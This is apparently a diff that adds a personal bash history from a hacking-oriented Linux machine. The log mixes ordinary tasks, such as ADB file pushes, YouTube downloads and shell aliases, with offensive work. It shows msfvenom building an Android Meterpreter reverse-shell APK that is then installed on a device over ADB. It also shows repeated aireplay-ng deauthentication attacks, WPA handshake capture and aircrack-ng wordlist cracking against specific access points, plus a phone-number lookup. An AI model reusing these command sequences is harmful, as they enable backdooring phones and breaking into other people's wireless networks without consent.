@@ -1,0 +1,1000 @@
+  154  adb connect 192.168.225.29
+  155  sh wifiadb.sh 
+  156  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.225.38 LPORT=4444 -R > \root\android.apk
+  157  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.225.38 LPORT=4444 -R  \root\android.apk
+  158  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.225.38 LPORT=4444 -R > \root\android.apk
+  159  msfvenom -p android/metrepreter/reverse_tcp LHOST=192.168.225.38 LPORT=4444 -R > \root\android.apk
+  160  adb netcfg
+  161  nano wifiadb.sh 
+  162  adb shell netcfg
+  163  adb tcpip 5555
+  164  sh jiofi.sh 
+  165  ifcofig
+  166  ifconfig
+  167  nmap -T4 -vv -A 192.168.225.38
+  168  dir
+  169  sh install.sh 
+  170  ls
+  171  ./install.sh 
+  172  adb shell
+  173  adb push backdoor.sh /storage/40B1-5B11/Android
+  174  exit
+  175  msfconsole
+  176  exit
+  177  l
+  178  cd Evil-Droid/evilapk/
+  179  dir
+  180  mv android.apk.apk android.apk
+  181  dir
+  182  adb devices
+  183  adb install android.apk 
+  184  adb shell
+  185  adb shell
+  186  adb push Evil-Droid/evilapk/android.apk /storage/sdcard0/Android
+  187  ifconfig
+  188  l
+  189  cd scripts
+  190  dir
+  191  cd ..
+  192  mkdir scriptbackup
+  193  mv *.sh scriptbackup/
+  194  exit
+  195  deb ipscan_3.5.1_amd64.deb 
+  196  eixt
+  197  exit
+  198  l
+  199  l
+  200  l
+  201  ./VMware-Workstation-Full-14.1.1-7528167.x86_64.bundle 
+  202  l
+  203  ping google
+  204  ping google.com
+  205  l
+  206  l
+  207  ifconfig
+  208  route -n
+  209  netdiscover
+  210  ifconfig
+  211  cat Install-Linux-tar.txt 
+  212  b
+  213  exitt
+  214  exit
+  215  cat apt
+  216  exit
+  217  ping google.com
+  218  l
+  219  l
+  220  uptime
+  221  w
+  222  cd Downloads/videos/
+  223  dir
+  224  youtube-dl https://www.youtube.com/watch?v=5nTuScU70As
+  225  youtube-dl https://www.youtube.com/watch?v=KwJyKmCbOws
+  226  cd Downloads/
+  227  cd videos/
+  228  youtube-dl https://www.youtube.com/watch?v=Gl17J2dJWIQ
+  229  apt-get install youtube-dl
+  230  youtube-dl https://www.youtube.com/watch?v=Gl17J2dJWIQ
+  231  youtube-dl https://www.youtube.com/watch?v=Ge7c7otG2mk
+  232  cd ..
+  233  xdg-open videos/
+  234  youtube-dl https://www.youtube.com/watch?v=nnKh6SFEaLg
+  235  youtube-dl https://www.youtube.com/watch?v=AU66C6HePfg
+  236  youtube-dl https://www.youtube.com/watch?v=OI5eO2CSib8
+  237  youtube-dl https://www.youtube.com/watch?v=9fLlkOMrMq4
+  238  cd Downloads/videos/
+  239  youtube-dl https://www.youtube.com/watch?v=vvsAvvKeGhc
+  240  youtube-dl https://www.youtube.com/watch?v=VMIpxqeoI1c
+  241  cd Downloads/videos/
+  242  youtube-dl https://www.youtube.com/watch?v=2GpNhYy2l08
+  243  cd Downloads/videos/
+  244  youtube-dl https://www.youtube.com/watch?v=qH1HCYy1NTc
+  245  youtube-dl https://www.youtube.com/watch?v=HW9hH0vlPEM
+  246  youtube-dl https://www.youtube.com/watch?v=KFSzLVXnQCg
+  247  youtube-dl https://www.youtube.com/watch?v=Yn9MOiNfID8
+  248  youtube-dl https://www.youtube.com/watch?v=qx1BsZBZfQU
+  249  youtube-dl https://www.youtube.com/watch?v=7TpsYofbAPA
+  250  youtube-dl https://www.youtube.com/watch?v=YFCDY_M06Fg
+  251  youtube-dl https://www.youtube.com/watch?v=8KeodgxXc0c
+  252  youtube-dl https://www.youtube.com/watch?v=v-l51HFaUm4
+  253  youtube-dl https://www.youtube.com/watch?v=uVnMy1qtJWc
+  254  youtube-dl https://www.youtube.com/watch?v=biLfGyLegVI
+  255  dir
+  256  cd restricted/
+  257  dir
+  258  ls
+  259  cd BigTits,BigAss/
+  260  dir
+  261  cd ..
+  262  dir
+  263  touch hotlinks.sh
+  264  nano hotlinks.sh 
+  265  xdg-open http://yoututbe.com
+  266  cd Downloads/videos/restricted/
+  267  ls
+  268  cd BigTits,BigAss/
+  269  ls
+  270  dir
+  271  cd ..
+  272  sh hotlinks.sh 
+  273  nano hotlinks.sh 
+  274  cd Downloads/videos/restricted/
+  275  dir
+  276  ls
+  277  nano hotlinks.sh 
+  278  chmod +x hotlinks.sh 
+  279  sh hotlinks.sh 
+  280  cd Downloads/videos/
+  281  youtube-dl https://www.youtube.com/watch?v=JIo-V0beaBw
+  282  youtube-dl https://www.youtube.com/watch?v=0Q3sRSUYmys
+  283  apt-get update
+  284  cd Stephanware
+  285  xdg-open Stephanware/videos/trailer/
+  286  sh studio.sh 
+  287  dir
+  288  dir cmd
+  289  cat cmd
+  290  touch cmd
+  291  nano cmd 
+  292  cat cmd 
+  293  nano /root/.bashrc 
+  294  .bashrc
+  295  android
+  296  cd /root/Downloads/android-studio/bin/
+  297  dir
+  298  cd 
+  299  cat cmd 
+  300  touch alias.sh
+  301  nano alias.sh 
+  302  chmod +x alias.sh 
+  303  sh alias.sh 
+  304  less /root/.bashrc
+  305  cat androidd
+  306  cat android
+  307  sh jiofi.sh 
+  308  cd Stephanware
+  309  jiofi
+  310  adbwifi
+  311  apt
+  312  apt-term
+  313  dir
+  314  cd adb-sh/
+  315  dir
+  316  mv wifiadb.sh adbwifi.sh
+  317  cd ..
+  318  dir
+  319  nano /root/.bashrc
+  320  dir
+  321  eixt
+  322  exit
+  323  dir
+  324  mv *.sh scripts/
+  325  dir
+  326  dir *.sh
+  327  cd /root/
+  328  dir
+  329  dir *.sh
+  330  sh apt-terminal.sh 
+  331  didr
+  332  dir
+  333  cd scripts/
+  334  dir
+  335  ln -s /root/cmd /root/
+  336  dir
+  337  jiofi
+  338  apt-term
+  339  allcommand-term
+  340  sh allCommand-terminal.sh 
+  341  cd scripts/
+  342  sh allCommand-terminal.sh 
+  343  figlet "cheatsheets"
+  344  exit
+  345  cd scripts/
+  346  dir
+  347  touch cheatsheets-terminal.sh
+  348  nano cheatsheets-terminal.sh 
+  349  chmod +x cheatsheets-terminal.sh 
+  350  sh cheatsheets-terminal.sh 
+  351  nano cheatsheets-terminal.sh 
+  352  sh cheatsheets-terminal.sh 
+  353  exit
+  354  cheatsheet
+  355  exit
+  356  cheatsheet
+  357  cd scripts/
+  358  dir
+  359  nano mount.sh 
+  360  dir
+  361  sh allCommand-terminal.sh 
+  362  nano allCommand
+  363  nano allCommand-terminal.sh 
+  364  sh allCommand-terminal.sh 
+  365  nano allCommand-terminal.sh 
+  366  sh allCommand-terminal.sh 
+  367  exit
+  368  command
+  369  commands
+  370  exit
+  371  cd scripts/
+  372  touch allCommand-terminal.sh
+  373  nano allCommand-terminal.sh 
+  374  chmod +x allCommand-terminal.sh 
+  375  eix
+  376  commands
+  377  nano allCommand-terminal.sh 
+  378  commands
+  379  cd 
+  380  commands
+  381  commands
+  382  exit
+  383  jiofi
+  384  commands
+  385  adbwifi
+  386  apt-term
+  387  exit
+  388  adb push Charlie_Puth_-_Done_For_Me_(feat._Kehlani)_[Official_Video].mp4 /storage/sdcard1
+  389  adb push "Charlie_Puth_-_Done_For_Me_(feat._Kehlani)_[Official_Video].mp4" /storage/sdcard1
+  390  adb push Charlie_Puth_-_Done_For_Me.mp4 /storage/sdcard1
+  391  adb push "Charlie_Puth_-_Done_For_Me.mp4" /storage/sdcard1
+  392  adb push "Charlie_Puth__Done_For_Me.mp4" /storage/sdcard1
+  393  adb devices
+  394  adb push Charlie_Puth_-_The_Way_I_Am_[Official_Lyric_Video].mp4 /storage/sdcard1
+  395  adb push VENOM_-_Official_Trailer_(HD).mp4
+  396  adb push VENOM_-_Official_Trailer_(HD).mp4 /storage/sdcard1
+  397  adb devices
+  398  adb connect 192.168.225.33
+  399  adb devices
+  400  adb shell
+  401  adb push VENOM_-_Official_Trailer_(HD).mp4 /storage/sdcard1
+  402  adb push VENOM_-_Official_Trailer.mp4 /storage/sdcard1
+  403  adb push Charlie_Puth_-_Done_For_Me.mp4 /storage/sdcard1
+  404  exit
+  405  adbwifi
+  406  exit
+  407  websploit
+  408  l
+  409  dir
+  410  cd scripts/
+  411  dir
+  412  sh alias.sh 
+  413  nano alias.sh 
+  414  sh alias.sh 
+  415  alias
+  416  alisa
+  417  alias
+  418  ls
+  419  alia
+  420  sh alias.sh 
+  421  eix
+  422  exit
+  423  cheatsheet
+  424  mountme
+  425  cd scripts/
+  426  dir
+  427  cat mount.sh 
+  428  dir
+  429  nano cheatsheets-terminal.sh 
+  430  figlet "Mr Stephan"
+  431  figlet "Mr.Stephan"
+  432  figlet "Mr. Stephan"
+  433  figlet "Mr . Stephan"
+  434  figlet "Mr .Stephan"
+  435  nano /root/.bashrc
+  436  figlet "Superuse"
+  437  figlet "Superuser"
+  438  figlet "Super user"
+  439  exit
+  440  figlet "Mr.Stephan"
+  441  nano /root/.bashrc
+  442  ln -s /root/Downloads/android-studio/bin/studio.sh /root/Desktop/
+  443  exit
+  444  apt-get install win32
+  445  apt-get install wine32
+  446  jiofi
+  447  apt-term
+  448  adbwifi
+  449  exit
+  450  dir
+  451  cd TheFatRat/
+  452  dir
+  453  cd cd 
+  454  cd ..
+  455  cd Trity/
+  456  dir
+  457  cat README.md 
+  458  trinity
+  459  dir
+  460  Trity
+  461  cat Trity/README.md 
+  462  trity
+  463  cd Trity/
+  464  chmod +x install.py 
+  465  ls
+  466  ./trity/
+  467  ./install.py 
+  468  l
+  469  dir
+  470  touch path
+  471  echo "/root/opensource/netool.sh" >> path 
+  472  cat path 
+  473  l
+  474  echo "sudo apt-get install build-essential dkms" >> apt 
+  475  cat apt
+  476  exit
+  477  l
+  478  netool
+  479  nettool
+  480  trity
+  481  exit
+  482  sudo apt-get install build-essential dkms
+  483  l
+  484  phonefy -n 9661269211
+  485  l
+  486  echo "apt-get install gdebi-core" >> apt
+  487  cat apt 
+  488  exit
+  489  cmd
+  490  dir 
+  491  echo "dpkg -i <pkg.deb>" >> cmd
+  492  cat cmd
+  493  exit
+  494  cd Stet
+  495  cd Stephanware
+  496  cd Linux.Softwares/
+  497  dir
+  498  deb AdbeRdr9.5.5-1_i386linux_enu.deb 
+  499  apt-get install deb
+  500  dir
+  501  dpkg -i AdbeRdr9.5.5-1_i386linux_enu.deb 
+  502  ./AdbeRdr9.5.5-1_i386linux_enu.deb 
+  503  dpkg -i AdbeRdr9.5.5-1_i386linux_enu.deb 
+  504  dpkg -i google-chrome-stable_current_amd64.deb 
+  505  exit
+  506  apt-get update
+  507  apt-get upgrade
+  508  apt-get update
+  509  ping google.com
+  510  apt-secure
+  511  sudo apt-get install cryptkeeper | Source
+  512  sudo apt-get install cryptkeeper
+  513  apt-get install cryptkeeper
+  514  ping google.com
+  515  xdg-open https://google.com
+  516  hostme
+  517  nano /root/.bashrc
+  518  serveron
+  519  nano /root/.bashrc
+  520  server
+  521  nano /root/.bashrc
+  522  apache2
+  523  figlet "Server : Online"
+  524  systemctl start apache2.service
+  525  nano /root/.bashrc
+  526  dir
+  527  fluxion
+  528  cd fluxion/
+  529  dir
+  530  sh fluxion.sh 
+  531  cd ..
+  532  dir
+  533  cd The
+  534  cd TheFatRat/
+  535  dir
+  536  sh setup.sh 
+  537  cat README.md 
+  538  dir
+  539  cd ..
+  540  cdir
+  541  dir
+  542  xdg-open http://localhost
+  543  commands
+  544  dir
+  545  cd scripts/
+  546  dir
+  547  cat allCommand
+  548  cd cmd
+  549  cat cmd 
+  550  touch start-server.sh
+  551  nano start-server.sh 
+  552  chmod +x start-server.sh 
+  553  figlet "Server : Online"
+  554  figlet "Server"
+  555  figlet "Apache2 Server"
+  556  figlet "Starting Server"
+  557  figlet " Server"
+  558  figlet "Start Server"
+  559  figlet "Started Server"
+  560  figlet "Start Server"
+  561  figlet "Server:Online"
+  562  f
+  563  cd /media/root/
+  564  dir
+  565  mkdir Stephanware
+  566  mountme
+  567  exit
+  568  mountme
+  569  exit
+  570  ping google.com
+  571  l
+  572  route
+  573  arp-scan -l
+  574  jiofi
+  575  nano /root/.bashrc
+  576  history
+  577  nano /root/.bashrc
+  578  websploit
+  579  msfconsole
+  580  xdg-open Stephanware/iLearn/Popular-Culture/
+  581  adb
+  582  adb devices
+  583  adb screenrec /storage/sdcard0/capture.mp4
+  584  adb shell screenrec /storage/sdcard0/capture.mp4
+  585  adb shell recscreen /storage/sdcard0/capture.mp4
+  586  adb shell recscreen /storage/sdcard0/capture.mad
+  587  adb shell
+  588  android
+  589  adb pull /storage/sdcard0/cap.mp4 /root/Desktop/
+  590  adb pull /storage/sdcard0/status.mp4 /root/Desktop/
+  591  adb pull /storage/sdcard0/stat1.mp4 /root/Desktop/
+  592  adb devices
+  593  adb shell
+  594  adb shell screenrecord /storage/sdcard0/ hello.mp4
+  595  adb shell screenrecord 40 /storage/sdcard0/ hello.mp4
+  596  adb shell
+  597  cd scripts/
+  598  dir
+  599  touch adb
+  600  echo "adb shell screenrecord /storage/sdcard0/capture.mp4" >>adb
+  601  cat adb
+  602  exit
+  603  echo I wish u could know what i mean
+  604  ifconfig
+  605  cd /root/Desktop/
+  606  mv stat1.mp4 status.mp4
+  607  xdg-open status.mp4 
+  608  mv status.mp4 /media/root/Stephanware/videos/
+  609  cd /root/Stephanware
+  610  dir
+  611  cd videos/
+  612  dir
+  613  ls -n status.mp4 /root/Desktop/
+  614  ln -s status.mp4 /root/Desktop/
+  615  cd 
+  616  ln -s /root/Stephanware/videos/status.mp4 /root/Desktop/
+  617  ln -s /media/root/Stephanware/ /
+  618  ln -s /media/root/Stephanware /
+  619  cd /Stephanware
+  620  dir
+  621  cd 
+  622  touch hi.mp4 /root/Desktop/
+  623  touch /root/Desktop/hi.mp4
+  624  mv /root/Desktop/hi.mp4 /Stephanware
+  625  cd /Stephanware
+  626  dir
+  627  dir hi.mp4 
+  628  mv hi.mp4 
+  629  rm hi.mp4 
+  630  dir
+  631  cd scripts/
+  632  dir
+  633  exit
+  634  video
+  635  cd /Stephanware
+  636  dir
+  637  exit
+  638  cd /Stephanware/
+  639  dir
+  640  exit
+  641  wallp
+  642  cd scripts/
+  643  dri
+  644  dir
+  645  cat video.sh > wallp.sh
+  646  nano wallp.sh 
+  647  chmod +x wallp.sh 
+  648  cd /Stephanware
+  649  dir
+  650  cd videos/
+  651  dir
+  652  cd music/
+  653  dir
+  654  cd /root/scripts/
+  655  dir
+  656  touch video.sh
+  657  chmod +x video.sh 
+  658  nano video.sh 
+  659  nano /root/.bashrc
+  660  vidoes
+  661  videos
+  662  nano /root/.bashrc
+  663  hostme
+  664  cd /Stephanware
+  665  dir
+  666  cd videos/
+  667  dir
+  668  cd ..
+  669  cd scripts/
+  670  dir
+  671  cd /root/scripts/
+  672  dir
+  673  nano wallp.sh 
+  674  nano video.sh 
+  675  videos
+  676  video
+  677  cd scripts/
+  678  dir
+  679  touch stephan.sh
+  680  ls -n
+  681  ln -s stephan.sh /root/Desktop/
+  682  l
+  683  cd scripts/
+  684  touch github
+  685  echo "https://github.com/Hack-with-Github/Awesome-Hacking" >> github 
+  686  cat github 
+  687  echo "https://github.com/Hack-with-Github/Free-Security-eBooks" >> github 
+  688  apt-get update
+  689  cd Doq
+  690  cd Dow
+  691  cd Downloads/
+  692  youtube-dl https://www.youtube.com/watch?v=TIUjANlD1tc
+  693  exit
+  694  ls -n 
+  695  xterm
+  696  ei
+  697  exit
+  698  ifconfig
+  699  exit
+  700  l
+  701  mountme
+  702  netstat
+  703  exit
+  704  netsh
+  705  netstat
+  706  exit
+  707  video
+  708  cat /root/.bashrc
+  709  jiofi
+  710  exit
+  711  jiofi
+  712  cd /root/scripts/
+  713  dir
+  714  mv /root/Desktop/jiofi.sh /root/scripts/
+  715  ln -s /root/scripts/jiofi.sh /root/Desktop/
+  716  dir
+  717  cat jiofi.sh 
+  718  cd 
+  719  dir
+  720  cd scripts/
+  721  dir
+  722  cat jiofi.sh 
+  723  jiofi
+  724  chmod +x jiofi.sh 
+  725  sh jiofi.sh 
+  726  nano jiofi.sh 
+  727  jiofi
+  728  cd /root/Desktop/
+  729  touch jio.hs
+  730  touch jio.sh
+  731  mv jio.sh jiofi.sh
+  732  ln -s /root/scripts/jiofi.sh /root/Desktop/
+  733  time
+  734  user
+  735  w
+  736  uptimem
+  737  uptime
+  738  eix
+  739  exit
+  740  dir
+  741  l
+  742  cd Downloads/
+  743  dir
+  744  xdg-open Hacking\ Android_full4free.com.pdf 
+  745  jiofi
+  746  cd /Stephanware
+  747  dir
+  748  cd Linux.Softwares/
+  749  dir
+  750  cd LibreOffice/
+  751  dir
+  752  gunzip LibreOffice_5.1.2_Linux_x86-64_deb.tar.gz 
+  753  dor
+  754  dir
+  755  ./LibreOffice_5.1.2_Linux_x86-64_deb.tar 
+  756  cd ..
+  757  cd..
+  758  dir
+  759  dpkg -i bittorrent_5.2.2_python2.4.deb 
+  760  exit
+  761  cd /Stephanware
+  762  dir
+  763  cd Linux.Softwares/
+  764  dir
+  765  cd VirtualBox/
+  766  dir
+  767  dpkg -i virtualbox-5.0_5.0.16-105871-Ubuntu-wily_
+  768  ./virtualbox-5.0_5.0.16-105871-Ubuntu-wily_
+  769  dir
+  770  dpkg -i virtualbox-5.0_5.0.16-105871-Ubuntu-wily_amd64.deb 
+  771  exit
+  772  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 wlan0mon
+  773  aireplay-ng --deauth 10 -a 40:C8:CB:19:0F:07 wlan0mon
+  774  mkdir capture
+  775  cd capture/
+  776  dir
+  777  airodump-ng --bssid 40:C8:CB:19:0F:07 --channel 6 --write wifi wlan0mon
+  778  echo "helloworld" >> rockyou.txt 
+  779  dir
+  780  aircrack-mg
+  781  aircrack-ng
+  782  iwconfig
+  783  airodump-ng start wlan0
+  784  airmon-ng start wlan0
+  785  iwconfig
+  786  airodump-ng wlan0mon
+  787  iwcoinfig
+  788  iwconfig
+  789  ifconfig stop wlan0mon
+  790  airmon-ng stop wlan0mon
+  791  ifconffig
+  792  ifconfig
+  793  exit
+  794  cd capture/
+  795  dir
+  796  aircrack-ng -w /root/rockyou.txt /root/capture/wifi-01.cap 
+  797  cd 
+  798  dir
+  799  wc -l rockyou.txt 
+  800  websploit
+  801  exit
+  802  ifconfig
+  803  airmon-ng stop wlan0mon
+  804  ifconfig wlan0 up
+  805  ifconfig
+  806  cd capture/
+  807  dir
+  808  rm *.*
+  809  dir
+  810  d 
+  811  cd
+  812  airodump-ng --bssid 40:C8:CB:19:0F:07 -c 6 --write /root/capture/crack-wpa wlan0mon
+  813  airmon-ng start wlan0
+  814  airmon-ng check kill
+  815  ifconfig
+  816  iwconfig
+  817  airodump-ng wlan0mon
+  818  aireplay --deauth 10 -a 40:C8:CB:19:0F:07 wlan0mon
+  819  aireplay-ng --deauth 10 -a 40:C8:CB:19:0F:07 wlan0mon
+  820  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 wlan0mon
+  821  airodump-ng --bssid 40:C8:CB:19:0F:07 --channel 6 --write /root/capture/hack wlan0mon
+  822  cd capture/
+  823  dir
+  824  rm *.*
+  825  dir
+  826  airodump-ng wlan0mon
+  827  ifconfig
+  828  dir
+  829  cd wifiphisher/
+  830  cd..
+  831  cd ...
+  832  cd.
+  833  cd..
+  834  cd
+  835  cd wordlists/
+  836  dir
+  837  dir rock
+  838  locate rockyou.txt
+  839  cd.
+  840  c
+  841  cd 
+  842  dir
+  843  ls
+  844  echo "$tephan76428967420" >>rockyou.txt 
+  845  jiofi
+  846  cd  /root/capture/
+  847  diir
+  848  dir
+  849  rm *.*
+  850  diir
+  851  dir
+  852  ifconf
+  853  ifconfig
+  854  echo h
+  855  echo "helloworld0" >> rockyou.txt 
+  856  wc -l rockyou.txt 
+  857  cat rockyou.txt | grep helloworld
+  858  iconfig
+  859  mountme
+  860  airmon-ng start wlan0
+  861  iwconfig
+  862  airodump-ng wlan0mon
+  863  airodump-ng --bssid 40:C8:CB:19:0F:07 -c 6 --write /root/capture/cap-wpa wlan0mon
+  864  aireplay-ng --deauth 10 -a 40:C8:CB:19:0F:07 wlan0mon
+  865  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 wlan0mon
+  866  ifconfig
+  867  iwconfig
+  868  airodump-ng wlan0mon
+  869  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 wlan0mon
+  870  aircrack-ng -w /root/rockyou.txt -b 40:C8:CB:19:0F:07 /root/capture/crack-wpa-01.cap 
+  871  airmon-n stop wlan0mon
+  872  airmon-ng stop wlan0mon
+  873  ifconfig
+  874  videos
+  875  video
+  876  clear
+  877  exit
+  878  rm /root/capture/*.*
+  879  airodump-ng --bssid 40:C8:CB:19:0F:07 -c 7 --write /root/capture/crack-wpa wlan0mon
+  880  cd wordlists/
+  881  dir
+  882  touch password.txt
+  883  nano password.txt 
+  884  cd 
+  885  aircrack-ng -w /root/wordlists/password.txt -b 40:C8:CB:19:0F:07 /root/capture/crack-wpa-01.cap 
+  886  cat rockyou.txt | grep hello
+  887  cat rockyou.txt | grep tephan
+  888  cat rockyou.txt | grep  $tephan
+  889  l
+  890  cd scripts/
+  891  dir
+  892  touch wlan0mon.sh
+  893  ln -s /root/scripts/wlan0mon.sh /root/
+  894  cd
+  895  nano wlan0mon.sh 
+  896  tye wlan0mon.sh
+  897  sh wlan0mon.sh 
+  898  cat wlan0mon.sh
+  899  sh wlan0mon.sh 
+  900  exit
+  901  aireplay -0 0 -a 12:FA:CE:91:1D:88 wlan0mon
+  902  aireplay-ng -0 0 -a 12:FA:CE:91:1D:88 wlan0mon
+  903  aireplay-ng --deauth 10 -a 12:FA:CE:91:1D:88 wlan0mn
+  904  aireplay-ng --deauth 10 -a 12:FA:CE:91:1D:88 wlan0mon
+  905  exit
+  906  aireplay-ng -0 0 -a 12:FA:CE:91:1D:88 wlan0mon
+  907  dir /root/capture/
+  908  cat /root/capture/cap-wpa-02.kismet.netxml 
+  909  dir
+  910  aircrack-ng -w /root/wordlists/password.txt -b 12:FA:CE:91:1D:88 /root/capture/cap-wpa-02.cap 
+  911  dir /root/capture/
+  912  rm /root/capture/*.*
+  913  exit
+  914  airmon-ng check kill
+  915  airmon-ng start wlan0
+  916  cd capture/
+  917  dir
+  918  rm *.*
+  919  dir
+  920  airodump-ng wlan0mon
+  921  airdump-ng wlan0mon
+  922  airodump-ng wlan0mon
+  923  airodump-ng --bssid 12:FA:CE:91:1D:88 -c 6 --write /root/capture/cap wlan0mon
+  924  aireplay -0 0 -a 12:FA:CE:91:1D:88  wlan0mon
+  925  aireplay-ng -0 0 -a 12:FA:CE:91:1D:88  wlan0mon
+  926  iwconfifg
+  927  iwconfig
+  928  airmon-ng stop wlan0mon
+  929  iwconfig
+  930  ifconfig wlan0 up
+  931  netstat -nap | grep apache | more
+  932  systemctl start apache2.service
+  933  systemctl stop apache2.service
+  934  systemctl start apache2.service\
+  935  systemctl start apache2.service
+  936  cat cmd
+  937  cd scripts/
+  938  dir
+  939  cat start-server.sh 
+  940  netstat -nap | grep apache2 | more
+  941  dir
+  942  cat cmc
+  943  cat cmd
+  944  nano cmd 
+  945  netstat -nap | grep apache2 | more
+  946  xdg-open http://localhost
+  947  airodump-ng --bssid 12:FA:CE:91:1D:88 -c 7 --write /root/capture/cap-wpa wlan0mon
+  948  iwconfig
+  949  ls
+  950  ls -n
+  951  chmod +x wlan0mon.sh
+  952  ls -n
+  953  sh wlan0mon.sh 
+  954  nano wlan0mon.sh
+  955  sh wlan0mon.sh 
+  956  cd scripts/
+  957  dir
+  958  mkdir just4fun
+  959  didr
+  960  cd just4fun/
+  961  didr
+  962  dir
+  963  touch doyoufeel.sh
+  964  touch thewayiam.sh
+  965  touch doneforu.sh
+  966  dir
+  967  rn doyoufeel.sh doesitfeel.sh
+  968  mv doyoufeel.sh doesitfeel.sh
+  969  di
+  970  dir
+  971  nano doesitfeel.sh 
+  972  chmod +x doesitfeel.sh 
+  973  sh doesitfeel.sh 
+  974  cat doesitfeel.sh >> doneforu.sh 
+  975  cat doesitfeel.sh >> thewayiam.sh 
+  976  chmod +x thewayiam.sh 
+  977  chmox +x doneforu.sh 
+  978  chmod +x doneforu.sh 
+  979  dir
+  980  nano doneforu.sh 
+  981  cat doesitfeel.sh >> doneforu.sh 
+  982  nano doneforu.sh 
+  983  mv doneforu.sh done4me.sh
+  984  dir
+  985  cat done4me.sh 
+  986  cat doesitfeel.sh 
+  987  nano thewayiam.sh 
+  988  sh thewayiam.sh 
+  989  nano thewayiam.sh 
+  990  sh thewayiam.sh 
+  991  nano done4me.sh 
+  992  nano thewayiam.sh 
+  993  sh thewayiam.sh 
+  994  nano thewayiam.sh 
+  995  sh thewayiam.sh 
+  996  nano done4me.sh 
+  997  nano doesitfeel.sh 
+  998  nano done4me.sh 
+  999  nano thewayiam.sh 
+ 1000  doesitfeel
+ 1001  doneforme
+ 1002  nano /root/.bashrc
+ 1003  cd /Stephanware
+ 1004  dir
+ 1005  mountme
+ 1006  dir
+ 1007  cd .
+ 1008  cd
+ 1009  dir
+ 1010  cd /media/root/
+ 1011  dir
+ 1012  cd Stephanware/
+ 1013  dir
+ 1014  cd videos/
+ 1015  dir
+ 1016  cd music/
+ 1017  dir
+ 1018  doesitfeels
+ 1019  doesitfeel
+ 1020  jiofi
+ 1021  thewayiam
+ 1022  ls
+ 1023  exit
+ 1024  netstat -nap | grep apache2 | more
+ 1025  cat cmd
+ 1026  mv cmd 
+ 1027  dir
+ 1028  mv cmd 
+ 1029  allcommand
+ 1030  cmd
+ 1031  command
+ 1032  commands
+ 1033  cd scripts/
+ 1034  dir
+ 1035  cat cmd 
+ 1036  netstat -nap | grep apache2 | more
+ 1037  systemctl restart apache2.service 
+ 1038  netstat -nap | grep apache2 | more
+ 1039  netstat -nap
+ 1040  ifconfig
+ 1041  netstat
+ 1042  history
+ 1043  mkdir /root/commandhistory
+ 1044  cd /root/commandhistory/
+ 1045  dir
+ 1046  date
+ 1047  date > history01
+ 1048  cat history01 
+ 1049  history >> history01 
+ 1050  cat history01 
+ 1051  nano /root/.bashrc
+ 1052  dir backup
+ 1053  mkdir backup
+ 1054  cat /root/.bashrc > /root/backup/bashrc-29thMay
+ 1055  cat /root/backup/bashrc-29thMay 
+ 1056  nano /root/.bashrc
+ 1057  cd /home/
+ 1058  di
+ 1059  dir
+ 1060  cd /home/
+ 1061  dir
+ 1062  mv WordWeb.apk /root/
+ 1063  didr
+ 1064  dir
+ 1065  cd 
+ 1066  dir WordWeb.apk 
+ 1067  cd /media/root/GhostDrive/
+ 1068  dir
+ 1069  cd StephanWarePC/
+ 1070  dir
+ 1071  cd MyApps/
+ 1072  dir
+ 1073  cd..
+ 1074  dir
+ 1075  cd..
+ 1076  cd
+ 1077  cd /media/root/GhostDrive/StephanWarePC/
+ 1078  dir
+ 1079  cd APK/
+ 1080  dir
+ 1081  cp WordWeb.apk /home/
+ 1082  cd /home/
+ 1083  dir
+ 1084  ifconfig
+ 1085  doesitfeel
+ 1086  mountme
+ 1087  doesitfeel
+ 1088  thewayiam
+ 1089  cd /home/
+ 1090  dir
+ 1091  cp /root/scripts/ /home/
+ 1092  cp -r /root/scripts/ /home/
+ 1093  dir
+ 1094  cd scq
+ 1095  cd scripts/
+ 1096  didr
+ 1097  dir
+ 1098  ln -s /home/ /root/Desktop/
+ 1099  ln -s /root/ /root/Desktop/
+ 1100  exit
+ 1101  android
+ 1102  cat /root/.bashrc
+ 1103  mount -B /home/video/ /root/Videos/
+ 1104  history
+ 1105  dir
+ 1106  cd /home/
+ 1107  dir
+ 1108  cd 
+ 1109  mount -B /home/download/ /root/Downloads/
+ 1110  mkdir localhost
+ 1111  touch index.html
+ 1112  nano index.html 
+ 1113  history
+ 1114  uptime
+ 1115  mkdir apache2server
+ 1116  dir
+ 1117  nano index.html 
+ 1118  figlet "Mount | Umount Commands"
+ 1119  figlet "Mount"
+ 1120  mount
+ 1121  df
+ 1122  cat /etc/fstab
+ 1123  mount | grep /home/picture/
+ 1124  figlet "Mount | Umount"
+ 1125  figlet "Mount | Umount Commands"
+ 1126  cd /media/root/
+ 1127  dir
+ 1128  cd Stephanware
+ 1129  dir
+ 1130  cd St
+ 1131  cd..
+ 1132  cd /media/root/
+ 1133  dir
+ 1134  cd Stephanware1
+ 1135  dir
+ 1136  cd..
+ 1137  cd /media/roo
+ 1138  umount /media/root/Stephanware1 
+ 1139  umount /media/root/Stephanware
+ 1140  dir
+ 1141  mkdir hackingnotes
+ 1142  mount -t iso9660 -o loop /home/iso/1000HackingTutorials.iso /root/hackingnotes
+ 1143  umount /root/hackingnotes 
+ 1144  mount -t iso9660 -o loop /home/iso/1000HackingTutorials.iso /root/hackingnotes
+ 1145  fuser -cu /home
+ 1146  fuse /Stephanware
+ 1147  fuser -cu /Stephanware
+ 1148  fuser -cu /home
+ 1149  history
+ 1150  dir backup
+ 1151  dir /home/backup/
+ 1152  dir
+ 1153  history > /home/backup/history.mount.iso
